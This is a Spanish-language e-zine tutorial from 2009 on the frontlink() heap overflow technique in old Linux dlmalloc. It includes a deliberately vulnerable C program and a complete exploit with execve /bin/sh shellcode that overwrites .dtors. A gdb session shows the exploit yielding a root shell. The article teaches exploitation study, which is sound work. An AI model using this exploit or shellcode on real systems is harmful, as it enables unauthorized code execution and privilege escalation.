@@ -1,0 +1,579 @@
+-[ 0x0B ]--------------------------------------------------------------------
+-[ Heap Overflows en Linux: II ]---------------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-38--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+1 - Prologo
+
+2 - Introduccion
+
+3 - Conocimientos Previos
+
+4 - Tecnica Frontlink() 
+
+5 - Conclusion
+
+6 - Referencias
+
+
+
+---[ 1 - Prologo
+
+Bien, finalmente hemos logrado alcanzar la segunda parte de esta atractiva
+entrega sobre Heap Overflows, por supuesto con la intencion de que antes
+hayas echado un buen repaso a la mayoria de articulos presentandos en nuestra
+anterior edicion de SET, la numero 37, los cuales servian de precedente para
+cualquiera de las tecnicas avanzadas que podamos ir describiendo tanto en
+este como en futuros articulos.
+
+
+
+---[ 2 - Introduccion
+
+Soy consciente de que algunos pueden estar preguntandose por que a estas
+alturas nos dedicamos todavia a estudiar vulnerabilidades que han sido
+parcheadas desde hace ya bastantes a~os. Mi respuesta suele ser casi siempre
+la misma, lo cierto es que no existe material decente en nuestra lengua que
+hasta ahora haya explicado tales fallos y como aprovecharse de ellos de forma
+eficiente.
+
+Ademas, es imposible adentrarse en articulos mas avanzados como "Exploiting
+The Wilderness" [4], "Malloc Maleficarum" [5], "The use of set_head to defeat
+the wilderness" [6] o incluso mi "Malloc Des-Maleficarum" [7] sin antes no
+haber estudiado las primeras tecnicas relativas a Heap Overflows.
+
+Es por estos motivos que studiamos y describimos en la primera entrega de este
+articulo la famosa tecnica unlink() descrita por MaxX con la cual podiamos
+conseguir la ejecucion de codigo arbitrario en un programa cuyos buffers
+declarados en el heap (con malloc(), calloc() o realloc()) fueran susceptibles
+de ser sobrescritos.
+
+Si bien no para iniciados, no dejaba de ser una tecnica suficientemente
+entendible y aplicable de forma practica para aquellos que tuvieran las ganas
+suficientes de probarla en una version antigua de Linux (versiones anteriores
+a GLIBC-2.3.6).
+
+No contentos con eso, mostraremos en esta entrega la segunda y tambien famosa
+tecnica frontlink(), que requiere unas condiciones bastante especificas para
+ser aplicable y que a su vez sabemos necesita de mucha concentracion para no
+perderse en la teoria que enseguida vamos a tratar.
+
+Anotar antes de empezar que, aun a pesar de ayudarnos del material de MaxX
+para describir la tecnica, este articulo no se trata ni mucho menos de una
+traduccion, sino que explica de una forma mas detallada cada uno de los pasos
+y ademas ofrece una version alternativa del programa vulnerable asi como
+una variacion del exploit original. No nos gusta reinventar la rueda, pero
+si de un arbol podemos obtener dos ramas, siempre sera mejor que una sola,
+y si estas son diferentes, mejor que mejor.
+
+Comenzamos...
+
+
+
+---[ 3 - Conocimientos Previos
+
+Como siempre, aprovecharemos parte del material escrito en su momento en [1]
+para explicar los aspectos que sean necesarios.
+
+Por un lado, algo que no explicamos en la primera entrega de este articulo,
+es el algoritmo utilizado por malloc de Doug Lea para calcular el tama~o
+exacto de un trozo o buffer solicitado por un usuario mediante malloc().
+
+Recordamos que la cabecera de un trozo en el heap, ya sea libre o asignado,
+se compone de los campos: prev_size, size, fd y bk. Si bien esto es cierto,
+tambien sabemos que los dos ultimos campos no son utilizados en un trozo
+asignado, ya que solo sirven para construir la lista doblemente enlazada de
+trozos libres, por lo tanto se aprovechan como parte de la memoria que
+contendra los datos introducidos en el buffer. Siendo esto asi, al tama~o de
+buffer solicitado por el usuario debemos agregarle en principio la cantidad
+de 8 bytes (prev_size + size).
+
+Aun debemos tener en cuenta algo mas, y es que como dijimos en la entrega
+anterior de este articulo, el campo "prev_size" del trozo siguiente al que
+estamos solicitando no se usa (ya que solo se usa cuando el trozo anterior
+es libre para indicar su tama~o), y por tanto puede mantener datos de usuario
+y formar parte del trozo que estamos solicitando para ahorrar memoria.
+De modo que el tama~o calculado hace un momento debemos restarle 4 bytes.
+
+Pero ademas de esto, para terminar, malloc solo trabaja con trozos cuyo tama~o
+es un multiplo de 8, de modo que asignara el multiplo de 8 mas cercano a la
+cantidad recien calculada.
+
+Esto puede lograrse mas o menos de la siguiente manera:
+
+#define MALLOC_ALIGNMENT ( SIZE_SZ + SIZE_SZ )
+#define MALLOC_ALIGN_MASK ( MALLOC_ALIGNMENT - 1 )
+
+#define request2size( req, nb ) \
+    ( nb = (((req) + SIZE_SZ) + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK ) 
+
+Por ejemplo, si nosotros hiciesemos una llamada como "buff = malloc(666)".
+El resultado seria:
+
+   nb = (((666) + 4) + 7) & ~(7) ) = 672 
+
+Es decir, nuestro tama~o real seria "672" que efectivamente resulta ser
+un multiplo de 8, pues 672 / 8 = 84.
+
+Como bien explica MaxX la macro real del malloc de Doug Lea es un poco
+mas complicada para controlar problemas de desbordamiento, pero para que
+entendamos su funcionamiento con esto nos llega.
+
+
+
+---[ 4 - Tecnica Frontlink() 
+
+Vamos ahora directamente a detallar la tecnica frontlink(), y para ello
+mostramos el codigo de la macro que deseamos abusar:
+
+#define frontlink( A, P, S, IDX, BK, FD ) {            \
+    if ( S < MAX_SMALLBIN_SIZE ) {                     \
+        IDX = smallbin_index( S );                     \
+        mark_binblock( A, IDX );                       \
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+        FD->bk = BK->fd = P;                           \
+[1] } else {                                           \
+        IDX = bin_index( S );                          \
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        if ( FD == BK ) {                              \
+            mark_binblock(A, IDX);                     \
+        } else {                                       \
+[2]         while ( FD != BK && S < chunksize(FD) ) {  \
+[3]             FD = FD->fd;                           \
+            }                                          \
+[4]         BK = FD->bk;                               \
+        }                                              \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+[5]     FD->bk = BK->fd = P;                           \
+    }                                                  \
+}
+
+La macro frontlink( ) es llamada cuando se desea liberar un trozo previamente
+asignado y sus trozos contiguos (tanto el anterior como el siguiente) no estan
+libres. Cuando esto ocurre, ninguno de los trozos contiguos puede ser
+desenlazado con unlink( ) para fusionarlo con el trozo a liberar (es decir,
+no podemos utilizar la tecnica de explotacion descrita en la anterior entrega),
+de modo que se llama directamente a frontlink( ) para buscar el lugar adecuado
+en que debe situarse dentro del "bin" correspondiente al tama~o del trozo.
+
+Si el trozo a liberar es lo suficientemente grande (mayor que 512 bytes),
+podemos llegar al bucle while se~alado en [2].
+
+El objetivo final de esta tecnica es lograr que "BK->fd" apunte a la direccion
+de DTORS_END o a la direccion de alguna entrada en la GOT. Si conseguimos esto,
+en [5] podremos escribir en dicha direccion la direccion del trozo P a liberar.
+La direccion de este trozo P coincide exactamente con su campo "prev_size", y
+si ahi se encuentra una instruccion "jump" que salte directamente a un
+shellcode colocado antes o despues de este trozo (segun las condiciones),
+entonces podremos ejecutar codigo arbitrario.
+
+Pero para lograr esto debemos antes haber realizado cierto trabajo sucio. En
+primer lugar deberiamos tener dentro del "bin" donde sera introducido el trozo
+que estamos liberando, un trozo con su campo "fd" manipulado que apunte a su
+vez a un trozo falso situado por ejemplo en el entorno pasado al programa. 
+El bin contiene los trozos en orden decreciente, de modo que el trozo con el
+campo "fd" manipulado debe ser mayor que el trozo a liberar para que el bucle
+while() pase por el antes de terminar.
+
+Imaginemos que previamente hemos liberado un trozo manipulado cuya cabecera
+pinta asi:
+
+                     / -> prev_size = sin modificar
+   Trozo manipulado -| -> size      = sin modificar
+   ---------------- -| -> fd        = direccion de un trozo en el entorno
+                     \ -> bk        = sin modificar
+
+Si el trozo a liberar es menor que este trozo manipulado, llegara un momento
+que en [3], gracias a la instruccion "FD = FD->fd", FD tomara el valor de
+esta direccion en el entorno, donde debemos crear otro trozo falso.
+
+Es en este punto donde debemos lograr que el bucle while( ) se detenga con
+FD apuntando al entorno. Y para ello debemos romper una de las condiciones
+que rigen dicho bucle, en concreto "S < chunksize(FD)". Esto se consigue
+haciendo que el valor del campo tama~o del trozo falso situado en el entorno
+sea "0".
+
+Una vez abandonado el bucle, el campo "bk" del trozo falso creado en el
+entorno debe tener la direccion de (DTORS_END - 8) o una entrada en la GOT
+menos 8. Este valor o direccion sera introducido en BK en la instruccion
+[4] "BK = FD->bk".
+
+Llegado a este punto, como dijimos, en [5] (BK->fd = P), sera situado en
+BK + 8 la direccion del trozo P, donde situaremos codigo maquina valido que
+sera ejecutado una vez el programa termine.
+
+Por lo tanto, el trozo creado en el entorno deberia pintar asi:
+
+                                    / -> prev_size = cualquiera
+ Trozo falso creado en el entorno - | -> size      = 0
+ -------------------------------- - | -> fd        = cualquiera
+                                    \ -> bk        = &(DTORS_END) - 8
+
+Dicho todo esto (complicado como se ha podido observar), las precondiciones
+del programa vulnerable para la realizacion de este ataque son las siguientes:
+
+   1) Un buffer en el heap que pueda desbordarse con una funcion como
+      strcpy( ) o algo similiar.
+
+   2) Un buffer contiguo a este que debe ser liberado y al que se le
+      modificara el campo "fd" de su cabecera gracias al desbordamiento
+      del buffer anterior.
+
+   3) Un buffer a ser liberado con un tama~o mayor que 512 pero menor
+      a su vez que el buffer anterior.
+
+   4) Un buffer declarado antes que el anterior que permita asi sobreescribir
+      el campo "prev_size" de este.
+
+El siguiente programa vulnerable es el mismo que el mostrado por MaxX pero con
+una peque~a modificacion que hara mas facil la explicacion del exploit. No
+obstante, cumple todas las precondiciones mostradas:
+
+-[ vulnh.c ]-
+
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+   char *first, *second, *third, *fourth, *fifth, *sixth;
+
+/*[1]*/ first = malloc(strlen(argv[2]) + 1);
+/*[2]*/ second = malloc(1500);
+/*[3]*/ third = malloc(12);
+/*[4]*/ fourth = malloc(666);
+/*[5]*/ fifth = malloc(1508);
+/*[6]*/ sixth = malloc(12);
+
+   printf("\nfirst = [ %p ]", first);
+   printf("\nsecond = [ %p ]", second);
+   printf("\nthird = [ %p ]", third);
+   printf("\nfourth = [ %p ]", fourth);
+   printf("\nfifth = [ %p ]", fifth);
+   printf("\nsixth = [ %p ]\n", sixth);
+
+/*[7]*/ strcpy(first, argv[2]);
+/*[8]*/ free(fifth);
+/*[9]*/ strcpy(fourth, argv[1]);
+
+/*[10]*/ strncpy(second, argv[3], 64);
+
+/*[0]*/ free(second);
+   
+   return 0;
+}
+
+-[ fin vulnh.c ]-
+
+Por que la tecnica unlink( ) no puede ser aplicada en este programa? Vemos que
+el trozo cuarto es desbordable mediante una llamada vulnerable a strcpy() en
+[9], pero desgraciadamente el quinto trozo contiguo es liberado antes de esta
+llamada y por lo tanto no podemos trucarlo en nuestro beneficio.
+
+No obstante, aun cuando este quinto trozo ha sido introducido en su "bin"
+correspondiente una vez llamado a free(), todavia podemos alterar su campo
+"fd" mediante el desbordamiento del cuarto trozo.
+
+En este punto, la tecnica unlink() seria viable si despues de [9] hubiera una
+llamada como free(fourth) que liberara el cuarto trozo. Como esto nunca ocurre,
+todavia podemos aprovechar la liberacion del segundo trozo en [0] para ejecutar
+codigo arbitrario.
+
+Este segundo trozo es mayor que 512, y ademas existe un buffer que le precede
+(first) que permite modificar el campo "prev_size" del segundo. Por lo tanto,
+y como ya dijimos, cumplimos todas las precondiciones para el exito del ataque.
+
+El exploit que veremos a continuacion realiza las siguientes acciones:
+
+   1) Utiliza el primer argumento pasado al programa para rellenar el cuarto
+      buffer, incluidos los campos prev_size y size del trozo siguiente (el
+      quinto) y sobreescribe el campo "fd" de este trozo con una direccion
+      apuntando al entorno pasado al programa donde se creara un trozo falso.
+
+   2) Utiliza el segundo argumento pasado al programa para rellenar el primer
+      buffer y sobreescribir el campo "prev_size" del segundo buffer, que como
+      ya sabemos forma parte de la zona de datos del primero (puesto que es
+      un trozo asignado y no libre), con una instruccion jump que saltara 12
+      bytes mas alla y caera directamente en la zona de datos dentro del
+      shellcode.
+
+   3) Utiliza el tercer argumento pasado al programa para insertar una
+      shellcode en el segundo buffer (a traves de una llamada segura a
+      strncpy() en [10]). Este por supuesto es nuestro cambio con respecto
+      al programa vulnerable original, ademas de las llamadas a "printf( )"
+      que nos ayudan a ver la situacion de los trozos en el heap.
+
+   4) Crea un entorno especifico con un trozo falso cuyos campos seran,
+      prev_size = DUMMY, size = 0, fd = DUMMY, bk = &(DTORS_END) -8.
+
+Al final del ataque, la disposicion del heap deberia quedar asi:
+
+   [ TROZO 1 ] -> Relleno
+
+   [ TROZO 2 ] -> PREV_SIZE = jump 0x0c
+               -> SIZE      = xxx
+               -> DATOS     = 8 bytes basura + Shellcode
+
+   [ TROZO 3 ]
+ 
+   [ TROZO 4 ] -> Relleno
+
+   [ TROZO 5 ] -> PREV_SIZE = xxx
+               -> SIZE      = xxx
+               -> FD        = direccion del entorno
+               -> BK        = xxx
+
+   [ TROZO 6 ]
+
+   [ WILDERNESS ]
+
+La direccion del entorno creado para el programa en el exploit se calcula
+de la siguiente manera:
+
+   ( (0xc0000000 - 4) - sizeof(name_prog) - (16 + 1) )
+
+Esto es asi (ya lo hemos explicado en otras ocasiones), porque todos los
+ejecutables se mapean en memoria a partir de la direccion (0xc0000000),
+luego vienen 4 bytes NULL, el nombre del ejecutable y (16 + 1) es lo que
+ocupara nuestro trozo falso mas 1 byte null para finalizar la cadena, a
+saber:
+
+   Trozo falso -> PREV_SIZE (4 bytes) = xxx 
+                  SIZE      (4 bytes) = 0
+                  FD        (4 bytes) = xxx
+                  BK        (4 bytes) = &(DTORS_END) - 8
+      
+                  + 1 byte NULL.
+
+Veamos antes de nada el efecto desastroso de sobreescribir el quinto trozo
+a traves del overflow del cuarto buffer:
+
+cristal:~# gdb -q ./vulnh
+(gdb) run `perl -e 'print "A"x680;'` black ngel
+Starting program: /root/vulnh `perl -e 'print "A"x680;'` black ngel
+
+Program received signal SIGSEGV, Segmentation fault.
+0x4008d8e8 in chunk_free () from /lib/libc.so.6
+
+Para el exploit necesitamos saber la direccion de DTORS_END a la que debemos
+restar 8:
+
+cristal:~# objdump -s -j .dtors ./vulnh
+
+./vulnh:	file format elf32-i386
+
+Contents of section .dtors:
+ 8049738 ffffffff 00000000			++++++++
+
+Bien, DTORS_END es igual a (0x08049738 + 4) y si restamos 8 a este valor
+obtenemos el resultado "0x08049734", que utilizaremos en el campo "bk" del
+trozo falso ubicado en el entorno.
+
+He aqui el exploit final basado en el original de MaxX:
+
+-[ exp_frontlink.c ]-
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#define DTORS_END_MINUS_8 0x08049734
+
+#define VULN_PROG "./vulnh"
+#define TROZO_FALSO ( (0xc0000000 - 4) - sizeof(VULN_PROG) - (16 + 1) )
+#define DUMMY 0x0defaced
+
+char shellcode[] = "\x41\x41\x41\x41\x41\x41\x41\x41" /* Trash */
+                   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+                   "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
+                   "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+char jump[] = "\x01\xeb\x0c\x01";
+
+int main(void)
+{
+   char *p;
+   char argv1[676+1];
+   char argv2[52];
+   char argv3[64];
+   char fake_chunk[16 + 1];
+   size_t size;
+   char **envp;
+   char *argv[] = { VULN_PROG, argv1, argv2, argv3, NULL };
+
+   p = argv1;
+   memset(p, 'B', 676 - 4);
+   p += 676 - 4;
+   *( (void **)p ) = (void *)(TROZO_FALSO);
+   p += 4;
+   *p = '\0';
+
+   p = argv2;
+   memset(p, 'B', 52 - sizeof(jump));
+   p += 52 - sizeof(jump);
+   memcpy(p, jump, sizeof(jump));
+
+   p = argv3;
+   memcpy(p, shellcode, sizeof(shellcode));
+
+   p = fake_chunk;
+   *( (void **)p ) = (void *)(DUMMY);
+   p += 4;
+   *( (void **)p ) = (void *)(0x00000000);
+   p += 4;
+   *( (void **)p ) = (void *)(DUMMY);
+   p += 4;
+   *( (void **)p ) = (void *)(DTORS_END_MINUS_8);
+   p += 4;
+   *p = '\0';
+
+   size = 0;
+   for (p = fake_chunk; p < fake_chunk + (16+1); p++) {
+      if (*p == '\0')
+         size++;
+   }
+   size++;
+
+   envp = malloc(size * sizeof (char *));
+
+   size = 0;
+   for (p = fake_chunk; p < fake_chunk + (16+1); p += strlen(p)+1) {
+      envp[size++] = p;
+   }
+   envp[size] = NULL;
+
+   execve(argv[0], argv, envp);
+
+   return (-1);
+} 
+
+-[ fin exp_frontlink.c ]-
+
+Se puede observar que este exploit es distinto al creado por MaxX, puesto
+que tambien el programa vulnerable diferia un poco del original. Utilizamos
+un tercer argumento donde introducimos el shellcode, que por cierto es un
+poco especial, puesto que al principio del mismo hay 8 bytes de basura (con
+caracteres "A"). Esto es necesario debido a que al liberar el segundo trozo,
+la macro frontlink() ejecuta estas dos instrucciones antes de [5]:
+
+        P->bk = BK;
+        P->fd = FD; 
+
+Y por lo tanto los campos "bk" y "fd" del segundo trozo (los primeros 8 bytes)
+seran machacados. Como nosotros sobreescribimos el campo "prev_size" del segundo
+trozo con un salto de 12 bytes (gracias al overflow producido en el primer
+trozo), esto no resulta ningun problema.
+
+Ahora ya podemos probar el exploit desde el mismo GDB:
+
+cristal:~ # gdb -q ./exp_frontlink
+(gdb) run
+Starting program: /root/exp_frontlink
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x400012b0 in _start () from /lib/ld-linux.so.2
+(gdb) c
+Continuing.
+
+first = [ 0x8049780 ]
+second = [ 0x80497b8 ]
+third = [ 0x8049d98 ]
+fourth = [ 0x8049da8 ]
+fifth = [ 0x804a048 ]
+sixth = [ 0x804a630 ]
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x400012b0 in _start () from /lib/ld-linux.so.2
+(gdb) c
+Continuing.
+sh-2.05b# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-2.05b# exit
+exit
+
+Program exited normally.
+(gdb)
+
+Premio!!!
+
+Hemos visto con todo esto que las condiciones para un ataque de esta clase
+en la vida real (real-life exploit o "in the wild") son bastante trilladas,
+aunque bien es cierto que todos los casos pueden darse; y lo mas importante
+de todo, si eres capaz de comprender esta tecnica estaras totalmente preparado
+para enfrentarte a cualesquiera otras tecnicas avanzadas de explotacion de
+binarios como las descritas en el Malloc Des-Maleficarum [7].
+
+Por ultimo, te invito a que no des por hecho y por cierto todo lo aqui descrito
+y que pruebes por ti mismo a crear el programa vulnerable y dise~ar el exploit,
+solo cuando empiezan a surgir los peque~os fallos y tengas que pasarte unas
+cuantas horas delante de GDB depurando un problema minusculo te daras verdadera
+cuenta de que la explotacion de vulnerabilidades puede convertirse en un arte
+solo apto para quienes lleven el hacking metido en las venas.
+
+
+
+---[ 5 - Conclusion
+
+Como tenemos la costumbre de decir, "hasta aqui hemos llegado". Espero
+haber cumplido con el objetivo principal de profundizar en los aspectos
+mas importantes de los Heap Overflow y con ello seguir abriendote camino
+hacia tecnicas mas avanzadas.
+
+Desconozco a dia de hoy sI habra una tercera parte de esta saga, aunque,
+de ser asi, estara basada seguramente en el articulo Exploting the
+Wilderness [4] de Phantasmal Phantasmagoria, describiendo en detalle la
+tecnica y sus posibilidades.
+
+Os invito sobre todo en este articulo a enviarme o comentarme vuestras
+dudas en las direcciones de correo "blackngel1@gmail.com" o
+"black@set-ezine.org" ya que ciertos pasos pueden resultar realmente
+complicados. Yo estare ahi para ayudaros a salvar dichos muros y lograr
+que todo el mundo pueda avanzar sin abandonar en medio del camino. Que
+nadie se de por vencido...
+
+Feliz Hacking!
+
+Un abrazo!
+blackngel
+
+
+
+---[ 6 - Referencias
+
+[1] Vudo - An object superstitiously believed to embody magical powers
+    http://www.phrack.org/issues.html?issue=57&id=8#article
+
+[2] Once upon a free()
+    http://www.phrack.org/issues.html?issue=57&id=9#article
+
+[3] Advanced Doug Lea's malloc exploits
+    http://www.phrack.org/issues.html?issue=61&id=6#article
+
+[4] Exploiting the Wilderness
+    http://seclists.org/vuln-dev/2004/Feb/0025.html
+
+[5] Malloc Maleficarum
+    http://seclists.org/bugtraq/2005/Oct/0118.html
+
+[6] The use of set_head to defeat the wilderness
+    http://www.phrack.org/issues.html?issue=64&id=9#article
+
+[7] Malloc Des-Maleficarum
+    http://www.phrack.org/issues.html?issue=66&id=10#article
+
+*EOF*
